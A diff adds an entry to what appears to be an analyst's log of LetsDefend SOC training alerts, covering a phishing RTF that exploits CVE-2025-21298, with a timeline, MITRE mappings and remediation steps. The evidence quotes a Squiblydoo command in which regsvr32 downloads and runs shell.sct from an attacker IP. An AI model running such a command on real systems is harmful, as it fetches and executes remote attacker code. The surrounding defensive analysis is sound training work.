@@ -376,3 +376,70 @@ Every alert I've worked on LetsDefend, in order. Entries include alerts I classi
   - Filter old incidents out of the scope (the 2023 WinRAR events were a different host and attack).
 
 ---
+
+## Alert #8 – SOC336 Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025-21298)
+- **Date worked:** 2026-11-07
+- **Severity:** Critical
+- **Alert type:** Malware
+- **Difficulty:** Medium
+- **Hypothesis:** An RTF attachment matching a zero-click OLE exploit could run code just by being previewed in Outlook. The key question was whether Outlook launched anything after the email arrived.
+
+**Evidence:**
+- Email Security: From `projectmanagement[@]pm[.]me` (anonymous Proton Mail address) to Austin@letsdefend.io, subject "Important: Action Required for Upcoming Project Deadline", attachment `mail.rtf`, sender IP 84[.]38[.]130[.]118, Action: Allowed. Only one recipient.
+- Endpoint – Processes (host DESKTOP-USER, user Austin): `OUTLOOK.EXE` (PID 4820) started at 08:05:15. At 08:06:08 Outlook launched `cmd.exe` (PID 6784), which launched `regsvr32.exe` (PID 7023) at 08:06:25.
+- Endpoint – Command line: `cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll` – the "Squiblydoo" technique, using a signed Windows binary to download and run a remote scriptlet.
+- Log Management – Proxy: `cmd.exe` (PID 6784) GET request for `http://84[.]38[.]130[.]118[.]com/shell.sct`, Device Action: Permitted.
+- Endpoint – Network: Connection to 84[.]38[.]130[.]118 at 08:06:42, 17 seconds after regsvr32 ran. Other connections (185.248.101.34, 13.225.78.26) had no Threat Intel match. Nothing after 08:07:10.
+- Threat intel: 84[.]38[.]130[.]118 tagged Malicious.
+- Anomaly: `explorer.exe` (PID 2104) started at 08:10:10 with parent `smss.exe` instead of the usual `userinit.exe`. Path and user (Austin) are legitimate; no further evidence linking it to the attack.
+
+**Timeline (endpoint time):**
+
+| Time | Event |
+|------|-------|
+| 02:12 | Phishing email with `mail.rtf` delivered (Allowed) |
+| 08:05:15 | Austin opens Outlook |
+| 08:06:08 | Outlook launches `cmd.exe` – RTF exploit triggered on open or preview |
+| 08:06:25 | `regsvr32` fetches `shell.sct` from the attacker's server |
+| 08:06:42 | Host connects to 84[.]38[.]130[.]118 |
+| After 08:07:10 | No further suspicious activity observed |
+
+**Screenshots:**
+
+![Process chain](screenshots/alert08-process-chain.png)
+
+*OUTLOOK.EXE launched cmd.exe, which launched regsvr32.exe – an email client should never start a command shell.*
+
+![regsvr32 command](screenshots/alert08-regsvr32-command.png)
+
+*Squiblydoo: regsvr32 downloading and running shell.sct from the attacker's server.*
+
+![Proxy request](screenshots/alert08-proxy-request.png)
+
+*The proxy permitted the request for shell.sct.*
+
+![Network connection](screenshots/alert08-network-c2.png)
+
+*Host connected to the malicious IP 84.38.130.118 at 08:06:42.*
+
+**Outcome:**
+- **Verdict:** True Positive
+- **Reasoning:** Outlook launched cmd.exe about a minute after starting, which used regsvr32 to download and run a scriptlet from the attacker's server; the host then connected to that malicious IP. Delivered as an RTF attachment from an anonymous address, matching the CVE-2025-21298 exploit pattern.
+- **Recommended action:** Isolate and reimage DESKTOP-USER (attacker code ran and its actions are unknown); apply the January 2025 patch for CVE-2025-21298 on all Windows hosts; until patched, set Outlook to read email in plain text; delete the email and block the sender address (not all of pm.me), the IP and the URL; hunt for Office apps spawning cmd.exe and regsvr32 with /i:http on other hosts; enable the Defender ASR rule blocking Office child processes; precautionary password reset for Austin.
+- **MITRE ATT&CK:**
+  - Initial Access: T1566.001 Phishing – Spearphishing Attachment
+  - Execution: T1203 Exploitation for Client Execution; T1059.003 Windows Command Shell
+  - Defense Evasion: T1218.010 System Binary Proxy Execution – Regsvr32
+  - Command and Control: T1105 Ingress Tool Transfer (shell.sct download)
+  - Note: The platform tagged T1059.001 (PowerShell) and T1574.002 (DLL side-loading); I found no evidence of either.
+- **Time taken:** 25 min
+- **Platform feedback:** 15 points (100%). All answers correct. Threat indicator: unexpected outgoing internet traffic; C2: Accessed; malware not quarantined.
+- **Lessons learned:**
+  - The parent process gives it away: Outlook should never launch cmd.exe.
+  - Attackers abuse trusted, signed Windows tools like regsvr32 to download and run code, which can slip past allow-listing.
+  - "Zero-click" means previewing can be enough, so I wrote "opened or previewed" rather than assuming the user clicked.
+  - The same Threat Indicator question needs a different answer depending on the evidence: outbound traffic was central here, unlike the local exploit in Alert #5.
+  - I note anomalies like explorer.exe's unusual parent, but don't claim they're malicious without evidence.
+
+---
+
